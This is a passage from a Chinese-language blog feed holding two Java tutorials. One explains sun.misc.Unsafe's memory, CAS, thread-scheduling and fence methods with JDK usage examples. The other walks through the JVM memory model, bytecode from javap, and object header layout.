class="line">&#x2F;&#x2F;在给定的内存块中设置值 </span><br><span class="line">public native void setMemory(Object o, long offset, long bytes, byte value); </span><br><span class="line">&#x2F;&#x2F;内存拷贝 </span><br><span class="line">public native void copyMemory(Object srcBase, long srcOffset, Object destBase, long destOffset, long bytes); </span><br><span class="line">&#x2F;&#x2F;获取给定地址值，忽略修饰限定符的访问限制。与此类似操作还有: getInt， getDouble，getLong，getChar等 </span><br><span class="line">public native Object getObject(Object o, long offset); </span><br><span class="line">&#x2F;&#x2F;为给定地址设置值，忽略修饰限定符的访问限制，与此类似操作还有: putInt,putDouble，putLong，putChar等 </span><br><span class="line">public native void putObject(Object o, long offset, Object x); </span><br><span class="line">public native byte getByte(long address); </span><br><span class="line">&#x2F;&#x2F;为给定地址设置byte类型的值（当且仅当该内存地址为 allocateMemory分配 时，此方法结果才是确定的） </span><br><span class="line">public native void putByte(long address, byte x);</span><br></pre></td></tr></table></figure><p>通常，我们在Java中创建的对象都处于堆内内存（heap）中，堆内内存是由JVM所管控的Java进程内存，并且它们遵循JVM的内存管理机制，JVM会采用垃圾回收机制统一管理堆内存。与之相对的是堆外内存，存在于JVM管控之外的内存区域，Java中对堆外内存的操作，依赖于Unsafe提供的操作堆外内存的native方法。</p><p>使用堆外内存的原因</p><ul><li>①对垃圾回收停顿的改善。由于堆外内存是直接受操作系统管理而不是JVM，所以当我们使用堆外内存时，即可保持较小的堆内内存规模。从而在GC时减少回收停顿对于应用的影响。</li><li>②提升程序I/O操作的性能。通常在I/O通信过程中，会存在堆内内存到堆外内存的数据拷贝操作，对于需要频繁进行内存间数据拷贝且生命周期较短的暂存数据，都建议存储到堆外内存。</li></ul><p><strong>典型应用</strong></p><p>DirectByteBuffer是Java用于实现堆外内存的一个重要类，通常用在通信过程中做缓冲池，如在Netty、MINA等NIO框架中应用广泛。DirectByteBuffer对于堆外内存的创建、使用、销毁等逻辑均由Unsafe提供的堆外内存API来实现。</p><p>下图为DirectByteBuffer构造函数，创建DirectByteBuffer的时候，通过Unsafe.allocateMemory分配内存、Unsafe.setMemory进行内存初始化，而后构建Cleaner对象用于跟踪DirectByteBuffer对象的垃圾回收，以实现当DirectByteBuffer被垃圾回收时，分配的堆外内存一起被释放。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816152128.png" alt="img"></p><ul><li>2、CAS相关</li></ul><p>如下源代码释义所示，这部分主要为CAS相关操作的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;**</span><br><span class="line">* CAS</span><br><span class="line">* @param o 包含要修改field的对象 </span><br><span class="line">* @param offset 对象中某field的偏移量 </span><br><span class="line">* @param expected 期望值 </span><br><span class="line">* @param update 更新值 </span><br><span class="line">* @return true | false </span><br><span class="line">*&#x2F;</span><br><span class="line">public final native boolean compareAndSwapObject(Object var1,long var2,Object var4,Object var5);</span><br><span class="line">public final native boolean compareAndSwapInt(Object var1,long var2,int var4,int var5);</span><br><span class="line">public final native boolean compareAndSwapLong(Object var1,long var2,long var4,long var6);</span><br></pre></td></tr></table></figure><p><strong>典型应用</strong></p><p>如下图所示，AtomicInteger的实现中，静态字段valueOffset即为字段value的内存偏移地址，valueOffset的值在AtomicInteger初始化时，在静态代码块中通过Unsafe的objectFieldOffset方法获取。在AtomicInteger中提供的线程安全方法中，通过字段valueOffset的值可以定位到AtomicInteger对象中value的内存地址，从而可以根据CAS实现对value字段的原子操作。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816152508.png" alt="img"></p><p>下图为某个AtomicInteger对象自增操作前后的内存示意图，对象的基地址 baseAddress=“0x110000”，通过baseAddress+valueOffset得到value的内存地址valueAddress=“0x11000c”；然后通过CAS进行原子性的更新操作，成功则返回，否则继续重试，直到更新成功为止。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816152544.png" alt="img"></p><ul><li>3、线程调度</li></ul><p>包括线程挂起、恢复、锁机制等方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;&#x2F;取消阻塞线程 </span><br><span class="line">public native void unpark(Object thread); </span><br><span class="line">&#x2F;&#x2F;阻塞线程 </span><br><span class="line">public native void park(boolean isAbsolute, long time); </span><br><span class="line">&#x2F;&#x2F;获得对象锁（可重入锁） </span><br><span class="line">@Deprecated </span><br><span class="line">public native void monitorEnter(Object o); </span><br><span class="line">&#x2F;&#x2F;释放对象锁 </span><br><span class="line">@Deprecated </span><br><span class="line">public native void monitorExit(Object o); </span><br><span class="line">&#x2F;&#x2F;尝试获取对象锁 </span><br><span class="line">@Deprecated </span><br><span class="line">public native boolean tryMonitorEnter(Object o);</span><br></pre></td></tr></table></figure><p>方法park、unpark即可实现线程的挂起与恢复，将一个线程进行挂起是通过park方法实现的，调用park方法后，线程将一直阻塞直到超时或者中断等条件出现；unpark可以终止一个挂起的线程，使其恢复正常。</p><p><strong>典型应用</strong></p><p>Java锁和同步器框架的核心类AbstractQueuedSynchronizer，就是通过调用LockSupport.park()和LockSupport.unpark()实现线程的阻塞和唤醒的，而LockSupport的park、unpark方法实际是调用Unsafe的park、unpark方式来实现。</p><ul><li>4、内存屏障</li></ul><p>在Java 8中引入，用于定义内存屏障（也称内存栅栏，内存栅障，屏障指令等，是一类同步屏障指令，是CPU或编译器在对内存随机访问的操作中的一个同步点，使得此点之前的所有读写操作都执行后才可以开始执行此点之后的操作），避免代码重排序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;&#x2F;内存屏障，禁止load操作重排序。屏障前的load操作不能被重排序到屏 障后，屏障后的load操作不能被重排序到屏障前 </span><br><span class="line">public native void loadFence(); </span><br><span class="line">&#x2F;&#x2F;内存屏障，禁止store操作重排序。屏障前的store操作不能被重排序到屏障后， 屏障后的store操作不能被重排序到屏障前 </span><br><span class="line">public native void storeFence(); </span><br><span class="line">&#x2F;&#x2F;内存屏障，禁止load、store操作重排序 </span><br><span class="line">public native void fullFence();</span><br></pre></td></tr></table></figure><p><strong>典型应用</strong></p><p>在Java 8中引入了一种锁的新机制——StampedLock，它可以看成是读写锁的一个改进版本。StampedLock提供了一种乐观读锁的实现，这种乐观读锁类似于无锁的操作，完全不会阻塞写线程获取写锁，从而缓解读多写少时写线程“饥饿”现象。由于StampedLock提供的乐观读锁不阻塞写线程获取读锁，当线程共享变量从主内存load到线程工作内存时，会存在数据不一致问题，所以当使用StampedLock的乐观读锁时，需要遵从如下图用例中使用的模式来确保数据的一致性。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816153050.png" alt="img"></p><p>如上图用例所示计算坐标点Point对象，包含点移动方法move及计算此点到原点的距离的方法distanceFromOrigin。在方法distanceFromOrigin中，首先，通过tryOptimisticRead方法获取乐观读标记；然后从主内存中加载点的坐标值(x,y)；而后通过StampedLock的validate方法校验锁状态，判断坐标点(x,y)从主内存加载到线程工作内存过程中，主内存的值是否已被其他线程通过move方法修改，如果validate返回值为true，证明(x,y)的值未被修改，可参与后续计算；否则，需加悲观读锁，再次从主内存加载(x,y)的最新值，然后再进行距离计算。其中，校验锁状态这步操作至关重要，需要判断锁状态是否发生改变，从而判断之前copy到线程工作内存中的值是否与主内存的值存在不一致。</p><p>下图为StampedLock.validate方法的源码实现，通过锁标记与相关常量进行位运算、比较来校验锁状态，在校验逻辑之前，会通过Unsafe的loadFence方法加入一个load内存屏障，目的是避免上图用例中步骤②和StampedLock.validate中锁状态校验运算发生重排序导致锁状态校验不准确的问题。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816153213.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java虚拟机内存模型</title>
      <link href="/Virtual%20machine%20memory%20model/"/>
      <url>/Virtual%20machine%20memory%20model/</url>
      
        <content type="html"><![CDATA[<p>java虚拟机内存模型</p><a id="more"></a><blockquote><p>作者：土豆是我的最爱</p><p>原文链接：<a href="https://blog.csdn.net/qq_37141773/article/details/103138476">https://blog.csdn.net/qq_37141773/article/details/103138476</a></p></blockquote><h1 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h1><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191119111545984.png" alt="img"></p><p>同样的java代码在不同平台生成的机器码肯定是不一样的，因为不同的操作系统底层的硬件指令集是不同的。</p><p>同一个java代码在windows上生成的机器码可能是0101…….，在linux上生成的可能是1100……，那么这是怎么实现的呢？</p><p>不知道同学们还记不记得，在下载jdk的时候，我们在oracle官网，基于不同的操作系统或者位数版本要下载不同的jdk版本，也就是说针对不同的操作系统，jdk虚拟机有不同的实现。</p><p>那么虚拟机又是什么东西呢，如图是从软件层面屏蔽不同操作系统在底层硬件与指令上的区别，也就是跨平台的由来。</p><p>说到这里同学们可能还是有点不太明白，说的还是太宏观了，那我们来了解下java虚拟机的组成。</p><h1 id="虚拟机组成"><a href="#虚拟机组成" class="headerlink" title="虚拟机组成"></a>虚拟机组成</h1><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125152256267.png" alt="img"></p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>我们先讲一下其中的一块内存区域栈，大家都知道栈是存储局部变量的，也是线程独有的区域，也就是每一个线程都会有自己独立的栈区域。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Math</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> initData = <span class="number">666</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User user = <span class="keyword">new</span> User();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> c = (a+b) * <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Math math = <span class="keyword">new</span> Math();</span><br><span class="line">    math.compute();</span><br><span class="line">    System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说起栈大家都不会陌生，数据结构中就有学，这里线程栈中存储数据的部分使用的就是栈，先进后出。</p><p>大家都知道每个方法都有自己的局部变量，比如上图中<font color=#98F5FF>main</font>方法中的<font color=#FF6A6A>math</font>，<font color=#FF6A6A>compute</font>方法中的<font color=#98F5FF>a b c</font>，那么java虚拟机为了区分不同方法中局部变量作用域范围的内存区域，每个方法在运行的时候都会分配一块独立的栈帧内存区域，我们试着按上图中的程序来简单画一下代码执行的内存活动。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125161338493.png" alt="img"></p><p>执行<font color=#FF69B4>main</font>方法中的第一行代码是，栈中会分配<font color=#FF6A6A>main()</font>方法的栈帧，并存储<font color=#FFA500>math</font>局部变量,，接着执行<font color=#FF6A6A>compute()</font>方法，那么栈又会分配<font color=#FFA500>compute()</font>的栈帧区域。</p><p>这里的栈存储数据的方式和数据结构中学习的栈是一样的，先进后出。当<font color=#FFA500>compute()</font>方法执行完之后，就会出栈被释放，也就符合先进后出的特点，后调用的方法先出栈。</p><p><strong>栈帧</strong><br>那么栈帧内部其实不只是存放局部变量的，它还有一些别的东西，主要由四个部分组成。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/2019112516224297.png" alt="img"></p><p>那么要讲这个就会涉及到更底层的原理–字节码。我们先看下我们上面代码的字节码文件。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125164159994.png" alt="img"></p><p>看着就是一个16字节的文件，看着像乱码，其实每个都是有对应的含义的，oracle官方是有专门的jvm字节码指令手册来查询每组指令对应的含义的。那我们研究的，当然不是这个。</p><p>jdk有自带一个<font color=#FFA500>javap</font>的命令，可以将上述class文件生成一种更可读的字节码文件。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125170812635.png" alt="img"></p><p>我们使用<font color=#FFA500>javap -c</font>命令将class文件反编译并输出到TXT文件中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Compiled from <span class="string">&quot;Math.java&quot;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">com</span>.<span class="title">example</span>.<span class="title">demo</span>.<span class="title">test1</span>.<span class="title">Math</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> initData;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> com.example.demo.bean.User user;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> com.example.demo.test1.Math();</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: aload_0</span><br><span class="line">       <span class="number">1</span>: invokespecial #<span class="number">1</span>                  <span class="comment">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">int</span> compute();</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: iconst_1</span><br><span class="line">       <span class="number">1</span>: istore_1</span><br><span class="line">       <span class="number">2</span>: iconst_2</span><br><span class="line">       <span class="number">3</span>: istore_2</span><br><span class="line">       <span class="number">4</span>: iload_1</span><br><span class="line">       <span class="number">5</span>: iload_2</span><br><span class="line">       <span class="number">6</span>: iadd</span><br><span class="line">       <span class="number">7</span>: bipush        <span class="number">10</span></span><br><span class="line">       <span class="number">9</span>: imul</span><br><span class="line">      <span class="number">10</span>: istore_3</span><br><span class="line">      <span class="number">11</span>: iload_3</span><br><span class="line">      <span class="number">12</span>: ireturn</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.<span class="keyword">String</span>[])</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: <span class="keyword">new</span>           #<span class="number">2</span>                  <span class="comment">// class com/example/demo/test1/Math</span></span><br><span class="line">       <span class="number">3</span>: dup</span><br><span class="line">       <span class="number">4</span>: invokespecial #<span class="number">3</span>                  <span class="comment">// Method &quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">       <span class="number">7</span>: astore_1</span><br><span class="line">       <span class="number">8</span>: aload_1</span><br><span class="line">       <span class="number">9</span>: invokevirtual #<span class="number">4</span>                  <span class="comment">// Method compute:()I</span></span><br><span class="line">      <span class="number">12</span>: pop</span><br><span class="line">      <span class="number">13</span>: getstatic     #<span class="number">5</span>                  <span class="comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">      <span class="number">16</span>: ldc           #<span class="number">6</span>                  <span class="comment">// String test</span></span><br><span class="line">      <span class="number">18</span>: invokevirtual #<span class="number">7</span>                  <span class="comment">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">      <span class="number">21</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;&#125;;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: sipush        <span class="number">666</span></span><br><span class="line">       <span class="number">3</span>: putstatic     #<span class="number">8</span>                  <span class="comment">// Field initData:I</span></span><br><span class="line">       <span class="number">6</span>: <span class="keyword">new</span>           #<span class="number">9</span>                  <span class="comment">// class com/example/demo/bean/User</span></span><br><span class="line">       <span class="number">9</span>: dup</span><br><span class="line">      <span class="number">10</span>: invokespecial #<span class="number">10</span>                 <span class="comment">// Method com/example/demo/bean/User.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">      <span class="number">13</span>: putstatic     #<span class="number">11</span>                 <span class="comment">// Field user:Lcom/example/demo/bean/User;</span></span><br><span class="line">      <span class="number">16</span>: <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时的jvm指令码就清晰很多了，大体结构是可以看懂的，类、静态变量、构造方法、compute()方法、main()方法。</p><p>其中方法中的指令还是有点懵，我们举compute()方法来看一下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Code:</span><br><span class="line">       <span class="number">0</span>: iconst_1</span><br><span class="line">       <span class="number">1</span>: istore_1</span><br><span class="line">       <span class="number">2</span>: iconst_2</span><br><span class="line">       <span class="number">3</span>: istore_2</span><br><span class="line">       <span class="number">4</span>: iload_1</span><br><span class="line">       <span class="number">5</span>: iload_2</span><br><span class="line">       <span class="number">6</span>: iadd</span><br><span class="line">       <span class="number">7</span>: bipush        <span class="number">10</span></span><br><span class="line">       <span class="number">9</span>: imul</span><br><span class="line">      <span class="number">10</span>: istore_3</span><br><span class="line">      <span class="number">11</span>: iload_3</span><br><span class="line">      <span class="number">12</span>: ireturn</span><br></pre></td></tr></table></figure><p>这几行代码就是对应的我们代码中compute()方法中的四行代码。大家都知道越底层的代码，代码实现的行数越多，因为他会包含一些java代码在运行时底层隐藏的一些细节原理。</p><p>那么一样的，这个jvm指令官方也是有手册可以查阅的，网上也有很多翻译版本，大家如果想了解可自行百度。</p><p>这里我只讲解本博文设计代码中的部分指令含义：</p><ol start="0"><li>将int类型常量1压入操作数栈</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: iconst_1     </span><br></pre></td></tr></table></figure><p>这一步很简单，就是将1压入操作数栈 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125173802589.png" alt="img"></p><ol><li>将int类型值存入局部变量1 </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: istore_1     </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>局部变量1，在我们代码中也就是第一个局部变量a，先给a在局部变量表中分配内存，然后将int类型的值，也就是目前唯一的一个1存入局部变量a</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125174002271.png" alt="img"></p><ol start="2"><li>将int类型常量2压入操作数栈</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: iconst_2</span><br></pre></td></tr></table></figure><ol start="3"><li>将int类型值存入局部变量2 </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: istore_2</span><br></pre></td></tr></table></figure><p>这两行代码就和前两行类似了。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125175335780.png" alt="img"></p><ol start="4"><li>从局部变量1中装载int类型值</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>: iload_1</span><br></pre></td></tr></table></figure><ol start="5"><li>从局部变量2中装载int类型值 </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>: iload_2</span><br></pre></td></tr></table></figure><p>这两个代码是将局部变量1和2，也就是a和b的值装载到操作数栈中</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125195538208.png" alt="img"></p><ol start="6"><li>执行int类型的加法</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>: iadd</span><br></pre></td></tr></table></figure><p><font color=#FFA500>iadd</font>指令一执行，会将操作数栈中的1和2依次从栈底弹出并相加，然后把运算结果3在压入操作数栈底。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125195857649.png" alt="img"></p><ol start="7"><li>将一个8位带符号整数压入栈</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>: bipush        <span class="number">10</span></span><br></pre></td></tr></table></figure><p> 这个指令就是将10压入栈</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125200118182.png" alt="img"></p><ol start="8"><li>执行int类型的乘法</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>: imul</span><br></pre></td></tr></table></figure><p>这里就类似上面的加法了，将3和10弹出栈，把结果30压入栈</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125200401195.png" alt="img"></p><ol start="9"><li>将将int类型值存入局部变量3 </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>: istore_3</span><br></pre></td></tr></table></figure><p>这里大家就不陌生了吧，和第二步第三步是一样的，将30存入局部变量3，也就是c</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125200811132.png" alt="img"></p><ol start="10"><li>从局部变量3中装载int类型值</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span>: iload_3</span><br></pre></td></tr></table></figure><p>这个前面也说了</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125201027757.png" alt="img"></p><ol start="11"><li>返回int类型值</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span>: ireturn</span><br></pre></td></tr></table></figure><p>这个就不用多说了，就是将操作数栈中的30返回</p><p>到这里就把我们<font color=#FF69B4>compute()</font>方法讲解完了，讲完有没有对局部变量表和操作数栈的理解有所加深呢？说白了赋值号=后面的就是操作数，在这些操作数进行赋值，运算的时候需要内存存放，那就是存放在操作数栈中，作为临时存放操作数的一小块内存区域。</p><p>接下来我们再说说方法出口。</p><p>方法出口说白了不就是方法执行完了之后要出到哪里，那么我们知道上面<font color=#FF69B4>compute()</font>方法执行完之后应该回到<font color=#FFA500>main()</font>方法第三行那么当<font color=#FF69B4>main()</font>方法调用<font color=#FF34B3>compute()</font>的时候，<font color=#FF34B3>compute()</font>栈帧中的方法出口就存储了当前要回到的位置，那么当<font color=#FF34B3>compute()</font>方法执行完之后，会根据方法出口中存储的相关信息回到<font color=#FFA500>main()</font>方法的相应位置。</p><p>那么<font color=#FFA500>main()</font>方同样有自己的栈帧，在这里有些不同的地方我们讲一下。</p><p>我们上面已经知道局部变量会存放在栈帧中的局部变量表中，那么<font color=#FFA500>main()</font>方法中的<font color=#FF6A6A>math</font>会存入其中，但是这里的math是一个对象，我们知道new出来的对象是存放在堆中的</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125202605931.png" alt="img"></p><p>那么这个math变量和堆中的对象有什么联系呢？是同一个概念么？</p><p>当然不是的，局部变量表中的math存储的是堆中那个math对象在堆中的内存地址</p><h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p>程序计数器也是线程私有的区域，每个线程都会分配程序计数器的内存，是用来存放当前线程正在运行或者即将要运行的<font color=#1E90FF>jvm指令码对应的地址</font>，或者说行号位置。</p><p>上述代码中每个指令码前面都有一个行号，你就可以把它看作当前线程执行到某一行代码位置的一个标识，这个值就是程序计数器的值。</p><p>那么jvm虚拟机为什么要设置程序计数器这个结构呢？就是为了多线程的出现，多线程之间的切换，当一个程序被挂起的时候，总是要恢复的，那么恢复到哪个位置呢，总不能又重新开始执行吧，那么程序计数器就解决了这个问题。</p><h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>在jdk1.8之前，有一个名称叫做持久带/永久代，很多同学应该听过，在jdk1.8之后，oracle官方改名为元空间。存放常量、静态变量、类元信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> initData = <span class="number">666</span>;</span><br></pre></td></tr></table></figure><p>这个initData就是静态变量，毋庸置疑是存放在方法区的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> User user = <span class="keyword">new</span> User();</span><br></pre></td></tr></table></figure><p>那么这个user就有点不一样了，user变量放在方法区，new的User是存放在堆中的</p><p>到这里我们就能意识到栈，堆，方法区之间都是有联系的。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20191125204225518.png" alt="img"></p><p>栈中的局部变量，方法区中的静态变量，如果是对象类型的话都会指向堆中new出来中的对象，那么红色的联系代表什么呢？我们先来了解一下对象。</p><p>对象组成<br>你对对象的了解有多少呢，天天用对象，你是否知道对象在虚拟机中的存储结构呢？</p><p>对象在内存中存储的布局可以分为3块区域：<font color=#1E90FF>对象头（Header）、实例数据（Instance Data）和对齐填充（Padding）</font>。下图是普通对象实例与数组对象实例的数据结构：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20170419212953720" alt="è¿éåå¾çæè¿°"></p><p><strong>对象头</strong></p><p>HotSpot虚拟机的对象头包括两部分信息：</p><p><strong>Mark Word</strong></p><blockquote><p>第一部分<font color=#FF69B4>markword</font>,用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等，这部分数据的长度在32位和64位的虚拟机（未开启压缩指针）中分别为32bit和64bit，官方称它为“MarkWord”。</p></blockquote><p><strong>Klass Pointer</strong></p><blockquote><p>   对象头的另外一部分是<font color=#FF69B4>klass</font>类型指针，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例.</p></blockquote><p><strong>数组长度（只有数组对象有）</strong></p><blockquote><p>   如果对象是一个数组, 那在对象头中还必须有一块数据用于记录数组长度.</p></blockquote><p><strong>实例数据</strong></p><blockquote><p>实例数据部分是对象真正存储的有效信息，也是在程序代码中所定义的各种类型的字段内容。无<br>论是从父类继承下来的，还是在子类中定义的，都需要记录起来。</p></blockquote><p><strong>对齐填充</strong></p><blockquote><p>第三部分对齐填充并不是必然存在的，也没有特别的含义，它仅仅起着占位符的作用。由于<br>HotSpot 